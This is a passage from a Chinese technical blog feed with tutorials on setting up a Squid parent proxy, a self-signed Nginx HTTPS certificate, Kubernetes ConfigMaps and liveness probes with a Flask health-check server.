    <content><![CDATA[<h2><span id="需求">需求</span></h2><p>在公司局域网部署的Squid代理服务器，和局域网中其他电脑一样无法访问外网。 需要给Squid配置一个父级的HTTP代理，这个父代理能访问外网，这样Squid就具备了访问外网的能力。</p>
<h2><span id="基础知识">基础知识</span></h2><p>Squid提供了<code>cache_peer</code>指令, 以定义邻居cache, 并告知Squid如何与邻居通信。<br>邻居cache有两种关系: 父子或姐妹</p>
<ul>
<li>父子cache, 可用于配置父代理来请求内容。 </li>
<li>邻居cache, 用于提供额外的cache命中，提升性能。 例如某些请求cache丢失，在邻居cache有可能命中，这样比从原始服务器请求速度要快。</li>
</ul>
<span id="more"></span>
<p><img data-src="/2024/1211211031/image1.png" alt="image1.png"></p>
<h2><span id="给squid配置父代理的实例">给Squid配置父代理的实例</span></h2><p>创建两台Linux虚拟机, 每台机器部署Squid, 我使用的发行版是Rocky Linux 9.4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.206.216.96 Squid服务器</span><br><span class="line">10.206.216.93 父代理(可以任意搭, 我这里也用的Squid)</span><br></pre></td></tr></table></figure>
<p>部署Squid方法参考: <a href="https://blog.csdn.net/pcj_888/article/details/143024481">https://blog.csdn.net/pcj_888&#x2F;article&#x2F;details&#x2F;143024481</a></p>
<p>要求:</p>
<ul>
<li>所有对内网的请求（10.206.216.0&#x2F;24)直接走原始服务器，不经过父代理。</li>
<li>其他所有HTTP请求都必须转发到父代理，不允许Squid与原始服务器直接会话。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client -&gt; Squid(10.206.216.96) -&gt; 父代理(10.206.216.93) -&gt; Internet</span><br><span class="line"></span><br><span class="line">client -&gt; Squid(10.206.216.96) -&gt; LAN(10.206.216.0/24)</span><br></pre></td></tr></table></figure>

<p>修改Squid服务器的主配置文件<code>squid.conf</code>, 添加如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http_access allow localhost</span><br><span class="line">http_access allow localnet</span><br><span class="line"></span><br><span class="line">acl direct-out-servers dst 10.206.216.0/24</span><br><span class="line"></span><br><span class="line">cache_peer 10.206.216.93 parent 3128 0 no-query default</span><br><span class="line">cache_peer_access 10.206.216.93 allow !direct-out-servers</span><br><span class="line">cache_peer_access 10.206.216.93 deny all</span><br><span class="line"></span><br><span class="line">never_direct allow all</span><br></pre></td></tr></table></figure>

<p>解释:</p>
<ul>
<li>cache_peer定义邻居cache, 这里需要指定父代理的HOST和PORT</li>
<li>cache_peer_access定义邻居cache的访问列表, 决定哪些请求允许或不允许发送到邻居cache.</li>
<li>never_direct定义不需要直接发送到原始服务器的访问列表，当请求匹配该列表时，必须被发送到邻居cache</li>
</ul>
<p>更详细的配置说明参考这篇: <a href="http://blog.zyan.cc/book/squid/chap10.html#a0">Squid中文权威指南</a></p>
<p>如果父代理需要basic认证, 可以修改cache_peer配置项, 添加认证信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cache_peer 10.206.216.93 parent 3128 0 no-query default login=peter:123 # 例如，父代理user为peter, password为123</span><br></pre></td></tr></table></figure>

<p>如果父代理挂了，允许Squid直接与原始服务器会话，去掉<code>never_direct allow all</code>这行配置即可。</p>
<p>校验并重新加载配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">squid -k parse</span><br><span class="line">squid -k reconfigure</span><br></pre></td></tr></table></figure>
<h2><span id="测试">测试</span></h2><p>1、请求外网时,返回200 OK，且走了父代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 10.206.216.96:3128 https://www.baidu.com </span><br><span class="line">返回200 OK, 且父代理access.log有记录</span><br></pre></td></tr></table></figure>
<p>2、请求内网(10.206.216.0&#x2F;24)，返回200 OK, 且不走父代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 10.206.216.96:3128 https://10.206.216.99</span><br><span class="line">返回200 OK, 且父代理access.log有记录</span><br></pre></td></tr></table></figure>

<p>3、stop父代理，再请求外网, 此时预期的结果是超时，返回503，即Squid不会与原始服务器建立连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 10.206.216.96:3128 https://www.baidu.com </span><br><span class="line">...</span><br><span class="line">超时, 返回503</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】 <a href="https://www.cmdschool.org/archives/4673">https://www.cmdschool.org/archives/4673</a><br>【2】 <a href="https://cloud-atlas.readthedocs.io/zh-cn/latest/web/proxy/squid/squid_socks_peer.html">https://cloud-atlas.readthedocs.io/zh-cn/latest/web/proxy/squid/squid_socks_peer.html</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Nginx自签名SSL证书，支持HTTPS</title>
    <url>/2024/1211220649.html</url>
    <content><![CDATA[<h2><span id="配置nginx自签名ssl证书的流程">配置Nginx自签名SSL证书的流程</span></h2><ul>
<li>生成一个SSL自签名证书</li>
<li>客户端机器信任这个自签名证书</li>
<li>修改RHEL服务器的Nginx配置</li>
<li>在客户机用curl测试HTTPS</li>
</ul>
<h2><span id="生成一个ssl自签名证书">生成一个SSL自签名证书</span></h2><p>在RHEL服务器上, 用openssl命令生成一个自签名证书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out server.key 2048 #生成一个2048位的RSA私钥,保存到server.key</span><br><span class="line">openssl req -x509 -new -nodes -key server.key -sha256 -days 3650 -out server.crt -subj &quot;/C=CN/CN=www.petertest.com/O=MyRootCA&quot; # 使用私钥server.key, 生成一个自签名的根证书server.crt, 有效期10年</span><br></pre></td></tr></table></figure>
<p>注: <code>CN=www.petertest.com</code>需要换成你的服务器域名, 否则curl测试会报错</p>
<span id="more"></span>

<h2><span id="客户端机器信任这个自签名证书">客户端机器信任这个自签名证书</span></h2><p>将server.crt传到客户端Linux机器上。 在RHEL&#x2F;Centos机器上, 需要把证书传到目录<code>/etc/pki/ca-trust/source/anchors/</code>，再用如下命令更新系统信任的CA证书列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-ca-trust</span><br></pre></td></tr></table></figure>
<h2><span id="修改rhel服务器的nginx配置">修改RHEL服务器的Nginx配置</span></h2><p>修改<code>nginx.conf</code>, 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name www.peter.com; # 设置域名</span><br><span class="line"></span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /server.crt; # 指定证书的绝对路径</span><br><span class="line">    ssl_certificate_key /server.key; # 指定私钥的绝对路径</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;Welcome to Nginx&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再把证书文件server.crt和私钥文件server.key拷到服务器的根目录下</p>
<h2><span id="测试">测试</span></h2><p>在客户机用curl测试, 返回200 OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://www.petertest.com:443 -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.20.1</span><br><span class="line">Date: Wed, 11 Dec 2024 14:02:13 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 25</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Welcome to Nginx&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://cloud.tencent.com/developer/article/1743989">https://cloud.tencent.com/developer/article/1743989</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s的ConfigMap是什么, 为什么设计ConfigMap, 如何使用ConfigMap</title>
    <url>/2024/1214161118.html</url>
    <content><![CDATA[<h2><span id="configmap简介-为什么设计configmap">ConfigMap简介, 为什么设计ConfigMap</span></h2><p>在k8s中, ConfigMap是一种API对象, 用于将非机密的配置数据存储到键值对中。<br>Configmap作用是, 把配置数据从应用代码中分隔开, 让镜像和配置文件解耦，实现了镜像的可移植性。</p>
<p>举例:<br>我有一个Squid(正向代理)的Pod, 需要获取用户配置的白名单做访问控制。 每个用户设置的白名单都不一样, 而且用户可以随时对白名单做增、删、改，所以这个白名单的配置不能写死在代码里。<br>可以把白名单配置存储到k8s的ConfigMap, 这样配置数据和镜像就实现了解耦，Pod中可以动态地获取白名单的配置。 </p>
<h2><span id="如何使用configmap">如何使用ConfigMap</span></h2><p>使用ConfigMap时, Pod可以将其用作环境变量、命令行参数或存储卷中的配置文件。<br>下面给出一个具体的案例，将ConfigMap用作存储卷中的配置文件，Pod中通过读取配置文件的内容，就获取到了配置信息。</p>
<span id="more"></span>

<h2><span id="configmap示例">ConfigMap示例</span></h2><p>需求描述: 我有一个Squid的Pod, 用户可以修改一些配置信息，例如：白名单, 父级代理。 要求创建一个ConfigMap存储这些配置，并且将ConfigMap用作存储卷中的配置文件.<br>配置信息如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whitelist: www.baidu.com:443,www.google.com:443 # 白名单</span><br><span class="line">customerProxy: 192.168.52.204:3128 # Squid的父级代理</span><br></pre></td></tr></table></figure>

<p><strong>步骤</strong><br>首先创建一个Squid Pod, 可以参考<a href="https://pcj600.github.io/2024/1208145435.html">Squid Pod部署</a></p>
<p>再创建ConfigMap, 新建文件<code>squid-configmap.yaml</code>, 内容如下:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">squid-configmap</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">squid</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">whitelist:</span> <span class="string">&quot;www.baidu.com,www.google.com&quot;</span></span><br><span class="line">  <span class="attr">parentProxy:</span> <span class="string">&quot;192.168.52.204:3128&quot;</span></span><br></pre></td></tr></table></figure>

<p>修改Deployment, 将ConfigMap映射到Pod的&#x2F;etc&#x2F;squid-config目录下。 具体做法是编辑<code>squid-deployment.yaml</code>, 添加如下内容:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid-config-volume</span></span><br><span class="line">    <span class="attr">configMap:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">squid-configmap</span></span><br><span class="line"><span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/squid-config</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">squid-config-volume</span></span><br></pre></td></tr></table></figure>
<p>完整的<code>squid-deployment.yaml</code>如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">squid</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">squid</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">squid</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid-volume</span></span><br><span class="line">          <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">            <span class="attr">claimName:</span> <span class="string">squid-claim</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid-config-volume</span></span><br><span class="line">          <span class="attr">configMap:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">squid-configmap</span></span><br><span class="line">      <span class="attr">dnsPolicy:</span> <span class="string">ClusterFirstWithHostNet</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">squid:IMAGE_PLACEHOLDER</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">livenessProbe:</span></span><br><span class="line">            <span class="attr">httpGet:</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">5000</span></span><br><span class="line">            <span class="attr">initialDelaySeconds:</span> <span class="number">5</span></span><br><span class="line">            <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">          <span class="attr">resources:</span></span><br><span class="line">            <span class="attr">limits:</span></span><br><span class="line">              <span class="attr">memory:</span> <span class="string">&quot;4Gi&quot;</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/log/squid</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">squid-volume</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/etc/squid-config</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">squid-config-volume</span></span><br></pre></td></tr></table></figure>

<p>应用configmap, deployment, 等待Pod Ready </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create -f squid-configmap.yaml</span><br><span class="line">kubectl -n squid delete deploy squid</span><br><span class="line">kubectl create -f squid-deployment.yaml</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong><br>先确认ConfigMap内容包含了配置信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n squid get cm squid-configmap -o yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">data:</span><br><span class="line">  customerProxy: 192.168.52.204:3128</span><br><span class="line">  whitelist: www.baidu.com,www.google.com</span><br><span class="line">kind: ConfigMap</span><br><span class="line">metadata:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>再进入Pod，确认<code>/etc/squid-config</code>目录下的文件内容 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n squid exec -it squid-64bbc7d8f5-dqklp -- /bin/bash</span><br><span class="line">cat /etc/squid-config/customerProxy</span><br><span class="line">192.168.52.204:3128</span><br><span class="line"># cat /etc/squid-config/whitelist</span><br><span class="line">www.baidu.com,www.google.com</span><br></pre></td></tr></table></figure>

<p>编辑configmap中的配置，等待一段时间后进入容器确认<code>/etc/squid-config/</code>的文件内容也随之更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n squid edit cm squid-congfimap</span><br><span class="line">把whitelist的值设置为www.4399.com, 等待一段时间后进入容器中，查看`/etc/squid-config/whitelist`的内容更新为www.4399.com</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】 <a href="https://kubernetes.io/docs/concepts/configuration/configmap/">Kubernetes Documentation - ConfigMaps</a><br>【2】 <a href="https://juejin.cn/post/7416195017084125236">kubernetes核心技术-ConfigMap</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>kubernetes的三种探针ReadinessProbe、LivenessProbe和StartupProbe,以及使用示例</title>
    <url>/2024/1214143923.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>k8s中的Pod由容器组成，容器运行的时候可能因为意外情况挂掉。为了保证服务的稳定性，在容器出现问题后能进行重启，k8s提供了3种探针</p>
<h2><span id="k8s的三种探针">k8s的三种探针</span></h2><p>为了探测容器状态，k8s提供了两个探针: LivenessProbe和ReadinessProbe</p>
<ul>
<li>LivenessProbe 存活性探针, 如果探测失败, 就根据Pod重启策略，判断是否要重启容器。</li>
<li>ReadinessProbe 就绪性探针，如果检测失败，将Pod的IP:Port从对应endpoint列表中删除，防止流量转发到不可用Pod上</li>
</ul>
<p>对于启动非常慢的应用, LivenessProbe和ReadinessProbe可能会一直检测失败，这会导致容器不停地重启。 所以k8s设计了第三种探针StartupProbe解决这个问题</p>
<ul>
<li>StartupProbe探针会阻塞LivenessProbe和ReadinessProbe, 直到满足StartupProbe(Pod完成启动)，再启用LivenessProbe和ReadinessProbe</li>
</ul>
<span id="more"></span>

<h2><span id="livenessprobe和readinessprobe支持三种探测方法">LivenessProbe和ReadinessProbe支持三种探测方法</span></h2><ul>
<li>ExecAction 容器中执行指定的命令，退出码为0表示探测成功。</li>
<li>HTTPGetAction 通过HTTP GET请求容器，如果HTTP响应码在【200，400)，认为容器健康。</li>
<li>TCPSocketAction 通过容器的IP地址和端口号执行TCP检查。如果建立TCP链接，则表明容器健康。</li>
</ul>
<p>可以给探针配置可选字段，用来更精确控制LivenessProbe和ReadinessProbe的行为</p>
<ul>
<li>initialDelaySeconds: 容器启动后等待多少秒后探针才开始工作，默认是0秒</li>
<li>periodSeconds: 执行探测的时间间隔，默认为10秒</li>
<li>timeoutSeconds: 探针执行检测请求后，等待响应的超时时间，默认为1秒</li>
<li>failureThreshold: 探测失败的重试次数，重试一定次数后认为失败。</li>
<li>successThreshold: 探针在失败后，被视为成功的最小连续成功数。默认值是 1。 存活和启动探测的这个值必须是 1。最小值是 1。</li>
</ul>
<h2><span id="实例-添加一个livenessprobe探针">实例: 添加一个LivenessProbe探针</span></h2><p>需求: 给Squid Pod添加一个livenessProbe, 每隔10秒检测一次Squid进程启动状态，如果连续3次检测进程异常, 就重启Pod</p>
<p>首先创建一个Squid Pod, 参考: <a href="https://pcj600.github.io/2024/1208145435.html">【k8s实践】 部署Squid</a></p>
<h3><span id="添加一个execaction类型的livenessprobe探针">添加一个ExecAction类型的livenessProbe探针</span></h3><p>可以通过<code>squid -k check</code>命令检测Squid进程运行状态，返回0说明正常, 返回非0值说明进程异常。<br>实例: 定义一个ExecAction类型的livenessProbe, deployment配置如下:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">exec:</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;squid&quot;</span>,<span class="string">&quot;-k&quot;</span>,<span class="string">&quot;check&quot;</span>]</span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">5</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>完整的squid-deployment.yaml如下:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">squid</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">squid</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">squid</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid-volume</span></span><br><span class="line">          <span class="attr">persistentVolumeClaim:</span></span><br><span class="line">            <span class="attr">claimName:</span> <span class="string">squid-claim</span></span><br><span class="line">      <span class="attr">dnsPolicy:</span> <span class="string">ClusterFirstWithHostNet</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">squid</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">squid:2.0</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">livenessProbe:</span> <span class="comment"># 添加一个ExecAction类型的探针</span></span><br><span class="line">            <span class="attr">exec:</span></span><br><span class="line">              <span class="attr">command:</span> [<span class="string">&quot;squid&quot;</span>,<span class="string">&quot;-k&quot;</span>,<span class="string">&quot;check&quot;</span>] <span class="comment"># 如果Squid进程运行, `squid -k check`返回0; 否则返回非0值</span></span><br><span class="line">            <span class="attr">initialDelaySeconds:</span> <span class="number">5</span></span><br><span class="line">            <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">            <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">          <span class="attr">resources:</span></span><br><span class="line">            <span class="attr">limits:</span></span><br><span class="line">              <span class="attr">memory:</span> <span class="string">&quot;4Gi&quot;</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/var/log/squid</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">squid-volume</span></span><br></pre></td></tr></table></figure>
<p>重新部署deployment, 通过<code>kubectl -n squid get deploy squid -o yaml</code>, 确认探针已配置到deployment.</p>
<p><strong>测试</strong><br><code>kubectl exec</code>进入容器, 使用<code>squid -k shutdown</code>手动停止Squid。 等30秒左右，可以观察到容器自动退出重启, 并且从日志中能看到健康检测失败结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@k8s-master ~]# kubectl -n squid exec -it squid-8674587b79-29mq8 -- /bin/bash</span><br><span class="line">[root@k8s-master /]# squid -k shutdown</span><br><span class="line">...</span><br><span class="line">[root@k8s-master /]# squid -k check</span><br><span class="line">2024/12/14 04:53:31| FATAL: failed to open /run/squid.pid: (2) No such file or directory</span><br><span class="line">    exception location: File.cc(190) open</span><br><span class="line">[root@k8s-master /]# echo $?</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"># 等待半分钟左右, 容器自动退出</span><br><span class="line">[root@k8s-master /]# command terminated with exit code 137</span><br><span class="line">[root@k8s-master ~]#</span><br><span class="line"></span><br><span class="line"># 此时宿主机上查看Pod，发现RESTARTS次数变为1</span><br><span class="line">[root@k8s-master /]# kubectl -n squid get pods  </span><br><span class="line">squid         squid-8674587b79-29mq8                     1/1     Running   1 (45s ago)     11m</span><br><span class="line"></span><br><span class="line"># 通过`kubectl describe`，可以查到探针检测失败的LOG</span><br><span class="line"> kubectl -n squid describe pod squid-8674587b79-29mq8 | grep Unhealthy</span><br><span class="line">  Warning  Unhealthy         2m49s  kubelet            Liveness probe failed: 2024/12/14 04:53:19| FATAL: failed to open /run/squid.pid: (2) No such file or directory</span><br><span class="line">  Warning  Unhealthy  2m39s  kubelet  Liveness probe failed: 2024/12/14 04:53:29| FATAL: failed to open /run/squid.pid: (2) No such file or directory</span><br><span class="line">  Warning  Unhealthy  2m29s  kubelet  Liveness probe failed: 2024/12/14 04:53:39| FATAL: failed to open /run/squid.pid: (2) No such file or directory</span><br></pre></td></tr></table></figure>

<h3><span id="添加一个httpget类型的livenessprobe探针">添加一个HttpGet类型的livenessProbe探针</span></h3><p>HttpGet探针要求Pod里有一个HTTP的server。 例如：请求<code>http://localhost:5000/healthz</code> 探测Pod健康状态，deployment设置如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">livenessProbe:</span></span><br><span class="line">  <span class="attr">httpGet:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">initialDelaySeconds:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>在Pod里写一个HTTP的server, 我这里用的Flask</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># logging</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line">file_handler = logging.FileHandler(<span class="string">&#x27;/var/log/squid/agent.log&#x27;</span>)</span><br><span class="line">formatter = logging.Formatter(<span class="string">&#x27;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">file_handler.setFormatter(formatter)</span><br><span class="line">logger.addHandler(file_handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/healthz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">health_check</span>():</span><br><span class="line">    retCode = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.run([<span class="string">&#x27;/usr/sbin/squid&#x27;</span>, <span class="string">&#x27;-k&#x27;</span>, <span class="string">&#x27;check&#x27;</span>])</span><br><span class="line">        retCode = result.returncode</span><br><span class="line">        <span class="keyword">if</span> retCode == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;OK&#x27;</span>&#125;), <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        logger.error(<span class="string">&quot;health_check %r&quot;</span>, traceback.format_exc())</span><br><span class="line">        <span class="keyword">return</span> (jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: -<span class="number">1</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Fail&#x27;</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Service Unavailable&#x27;</span>&#125;), <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: retCode, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Fail&#x27;</span>&#125;), <span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>再把脚本做到镜像里，安装python3和pip依赖(flask,requests),重新打包部署</p>
<p><strong>测试</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost:5000/healthz</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;OK&quot;&#125;</span><br></pre></td></tr></table></figure>


<h2><span id="参考">参考</span></h2><p>[1] <a href="https://juejin-cn.translate.goog/post/7018950464964132877?_x_tr_sl=zh-CN&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc&_x_tr_hist=true">Correct use of k8s probe</a><br>[2] <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">Configure Liveness, Readiness and Startup Probes</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Cheetsheet</title>
    <url>/2024/1215170644.html</url>
    <content><![CDATA[<p>整理如下内容:</p>
<ul>
<li>数据结构和算法</li>
<li>常用库和使用方法示例</li>
<li>Flask cheetsheet<span id="more"></span></li>
</ul>
